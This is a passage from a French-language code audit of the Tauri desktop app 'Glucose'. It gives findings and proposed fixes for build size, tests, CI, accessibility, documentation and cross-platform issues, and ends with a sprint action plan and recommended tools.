- `reqwest = { features = ["blocking", "json"] }` → tire OpenSSL natif (~3-4 MB binaire). Et `blocking` n'est utilisé nulle part dans `lib.rs` qui utilise tout async.
- `tokio = { features = ["full"] }` → tous les composants tokio même non utilisés.
**Fix proposé :**
```toml
reqwest = { version = "0.12", default-features = false, features = ["json", "rustls-tls"] }
tokio = { version = "1", features = ["fs", "process", "rt-multi-thread", "macros"] }
```
Gain estimé : ~2-3 MB sur le binaire final.
**Effort :** S

### 🟠 B-05 — Pas d'analyse de bundle
**Fix proposé :** `vite-bundle-analyzer` ou `rollup-plugin-visualizer` pour identifier les gros morceaux.
**Effort :** S

### 🟡 B-06 — `gen/` et `target-temp/` versionnés ?
**À vérifier :** `git ls-files src-tauri/gen/` et `src-tauri/target*`. Le `target/` est gros et doit être git-ignored.
**Effort :** S

---

# 7. Tests / qualité

### 🔴 T-01 — Aucun test unitaire (priorité haute pour `mirrorGraph.ts`)
**Problème :** 12 121 lignes, zéro test. Le cycle detector miroir ([mirrorGraph.ts](src/store/mirrorGraph.ts)) est pure logic, critique pour Phase 4. Sans tests, une régression peut introduire un crash Inception.
**Fix proposé :** Vitest + tests prioritaires :
1. `mirrorGraph.test.ts` — cycles A↔B, A→B→C→A, deep nested, no folders, missing folder
2. `lod.test.ts` — `computeLOD` boundaries, `shouldRenderArrow` les 4 conditions × 3 LOD
3. `MembraneRenderer.colorToHue` — hex, hsl, malformed
4. `Quadtree.test.ts` — query bounds
5. `nanoid.test.ts` — uniqueness/length

**Effort :** M (poser le terrain), L (couverture)

### 🔴 T-02 — Aucune config lint
**Fix proposé :** **Biome** (rapide, zero-config) :
```bash
bun add -D --exact @biomejs/biome
bunx biome init
```
+ règle `noExplicitAny: error` (à mettre `warn` initialement).
**Effort :** S

### 🔴 T-03 — Aucune CI
**Fix proposé :** `.github/workflows/ci.yml` minimal :
```yaml
on: [push, pull_request]
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: oven-sh/setup-bun@v1
      - run: bun install
      - run: bun run typecheck
      - run: bun run lint
      - run: bun run test
```
+ workflow `release.yml` sur tag pour `tauri build` Windows.
**Effort :** M

### 🟡 T-04 — Pas de pre-commit hook
**Fix proposé :** `husky` + `lint-staged` : typecheck + format sur fichiers staged.
**Effort :** S

---

# 8. UX / Accessibilité

### 🔴 U-01 — Strings UI codées en dur en français → impossible à traduire
**Problème :** ~150 strings UI inline. Pour un soft public, l'anglais est attendu en option.
**Fix proposé :** Adopter `i18next` ou solution custom légère :
```tsx
const t = useTranslation();
<button>{t("toolbar.export-png")}</button>
```
+ `src/i18n/{fr,en}.json`.
**Effort :** L

### 🟠 U-02 — Aucun focus visible sur les boutons
**Problème :** `<button>` Tailwind sans `:focus-visible`. Navigation clavier illisible.
**Fix proposé :** Dans `index.css` :
```css
button:focus-visible { outline: 2px solid #93c5fd; outline-offset: 2px; }
```
**Effort :** S

### 🟠 U-03 — Pas de tab order maîtrisé dans les panels
**Problème :** Tab dans DomainsPanel saute partout. Échap ne ferme pas systématiquement.
**Fix proposé :** Trap focus dans dialog. ARIA roles. `Escape` listener.
**Effort :** M

### 🟠 U-04 — Pas de feedback opérations longues
**Cas concrets :** Import vidéo (yt-dlp 30+ s), export PNG, fit-view sur gros projet.
**Fix proposé :** Overlay progress + bouton annuler.
**Effort :** M

### 🟠 U-05 — Survenue silencieuse d'erreurs
**Problème :** `Assets.load()` échec → `console.error` mais aucune notif user. L'image n'apparaît pas, l'utilisateur croit que ça a freezé.
**Fix proposé :** Toast d'erreur + retry button.
**Effort :** S

### 🟡 U-06 — Tooltips manquants
**Problème :** Boutons "↻", "i" — `title` HTML mais pas systématique.
**Fix proposé :** Audit toolbar + composants. Titre court + raccourci entre crochets.
**Effort :** S

### 🟡 U-07 — Pas d'indication visuelle du LOD actuel
**Problème :** Quand le LOD bascule (méso/macro), le user voit l'effet mais ne comprend pas. Note : LOD **désactivé** actuellement dans `lod.ts:15`.
**Fix proposé :** Petit badge en bas de la minimap "ZOOM 0.4× — Aperçu" / "ZOOM 1.0× — Édition".
**Effort :** S

---

# 9. Documentation

### 🔴 D-01 — README.md absent à la racine
**Fix proposé :** README simple :
```markdown
# Glucose
> Surface cognitive infinie pour créateurs.

## Installation
- Windows : télécharger `Glucose_x.y.z_x64-setup.exe`

## Démarrage rapide
[GUIDE.md](GUIDE.md)

## Roadmap
[ROADMAP.md](ROADMAP.md)

## License
[LICENSE](LICENSE)
```
**Effort :** S

### 🔴 D-02 — LICENSE absent
**Fix proposé :** Choisir et créer le fichier. Recommandation MIT pour adoption large, ou GPL-3.0 pour vision Xanadu (l'esprit "tout est ouvert").
**Effort :** S — décision auteur

### 🟠 D-03 — Pas de CONTRIBUTING.md
**Fix proposé :** Court guide : setup dev, conventions de commits, structure du code, comment ajouter un domaine, etc.
**Effort :** S

### 🟡 D-04 — JSDoc/TSDoc absent
**Fix proposé :** TSDoc minimal sur exports publics : `mirrorGraph`, `lod`, `getSymbioticHue`, `MembraneRenderer`. Markdown éditeur le supporte → tooltips IDE.
**Effort :** S

---

# 10. Cross-platform

### 🟠 X-01 — User-Agent menteur dans Rust
**Fichier :** [src-tauri/src/lib.rs:11](src-tauri/src/lib.rs#L11)
```rust
.user_agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36")
```
**Problème :** Prétend être Linux WebKit même sur Windows. Comportement inhabituel, peut être détecté comme bot.
**Fix proposé :** `Glucose/0.2.0 (+https://glucose.app)` honnête.
**Effort :** S

### 🟡 X-02 — Police système assumée 30+ fois
**Problème :** `fontFamily: "system-ui, -apple-system, sans-serif"` répété. Risque de fallback ugly sur Linux sans `system-ui`.
**Fix proposé :** Variable CSS `--glucose-font-ui` dans `index.css`.
**Effort :** S

### 🟡 X-03 — Tests cross-OS absents
**Fix proposé :** Matrix CI (`os: [ubuntu, windows, macos]`).
**Effort :** S (config seule), ne couvre pas les régressions visuelles.

---

# 11. Décisions architecturales à prendre

Ces points ne sont pas des bugs mais des choix de produit qui doivent être tranchés avant publication :

1. **License** : MIT (pragmatique, large adoption) vs GPL-3.0 (cohérent avec vision Xanadu/WikiGit Phase 9).
2. **Modèle économique** : 100% gratuit (donations) vs freemium (cloud sync premium).
3. **Cible mémoire** : RAM minimum supportée (4 GB ? 8 GB ?) → influe sur les limites de tailles à imposer (R-05 etc.).
4. **Telemetry** : opt-in pour usage analytics ou rien ?
5. **Auto-update** : Tauri supporte le pattern, à activer ?
6. **Code-signing** : ~200$/an pour signature Authenticode, sinon SmartScreen warning. Vaut le coup pour grand public.
7. **Distribution** : .exe direct vs Windows Store vs winget ? Linux : flatpak, AppImage, deb, snap ?

---

# 📋 Plan d'action recommandé

## Sprint 1 — Bloquants release v0.3 (~10 jours)

**🛡️ Sécurité (obligatoire)** :
- [ ] SEC-01 à SEC-04 — scope checks sur toutes les commandes Tauri qui prennent un path
- [ ] SEC-05 — pinning + SHA256 yt-dlp
- [ ] SEC-06 — protection SSRF dans `fetch_image`
- [ ] SEC-07 — restreindre `assetProtocol.scope`
- [ ] SEC-08 — restreindre capabilities
- [ ] SEC-09 — retirer `rehypeRaw`

**Robustesse** :
- [ ] R-01 — validation Zod `loadProject`
- [ ] R-02 — clamps coordonnées extrêmes
- [ ] R-03 — alerte cycle mirror

**Performance critique** :
- [ ] P-02 — fix `getSymbioticHue` memo
- [ ] P-04 — brancher Quadtree sur le rendu
- [ ] P-05 — `fitView` sans spread overflow

**Build** :
- [ ] B-01 — manualChunks vite
- [ ] B-04 — réduire deps Cargo
- [ ] D-01, D-02 — README + LICENSE

**Qualité minimum** :
- [ ] T-02 — config Biome
- [ ] T-03 — CI GitHub Actions

## Sprint 2 — Release v0.4 (~3-4 semaines)

- [ ] P-01 — split GlucoseCanvas en hooks
- [ ] P-03, P-06, P-07 — optimisations diverses
- [ ] P-08 — selectors Zustand stables
- [ ] M-01 à M-04 — cleanup mémoire
- [ ] A-01 — bus typé pour events
- [ ] A-02, A-03 — refacto IO/utils
- [ ] C-01 à C-06 — extractions / typage / store slices
- [ ] B-02, B-03 — lazy-loading + KaTeX dynamique
- [ ] T-01 — tests unitaires (mirrorGraph en priorité)
- [ ] U-01 — i18n
- [ ] U-02, U-03 — accessibilité keyboard

## Sprint 3 — Continu

- [ ] C-07, C-08 — propreté code
- [ ] M-05, R-04 à R-07 — robustesse fine
- [ ] D-03, D-04 — docs étendues
- [ ] U-04 à U-07 — UX polish
- [ ] X-01 à X-03 — cross-platform
- [ ] A-04 — versionnage du schema projet

---

# Annexe — Outils recommandés

- **Lint** : Biome (https://biomejs.dev/)
- **Tests** : Vitest (https://vitest.dev/)
- **Validation runtime** : Zod (https://zod.dev/)
- **Bundle analyzer** : `rollup-plugin-visualizer`
- **Pre-commit** : Husky + lint-staged
- **i18n** : i18next ou `@formatjs/intl`
- **Code signing Windows** : SignTool + cert Authenticode (DigiCert ~$200/an)

---

**Total : 51 items — 21 critiques, 21 majeurs, 9 mineurs.**
**Estimation effort : ~10 jours pour v0.3 (bloquants), ~25-30 jours pour v0.4 (qualité), continu pour les mineurs.**
**Audit fait sur la base réelle du code à fin Phase 5 — pas du diagnostic de mémoire.**
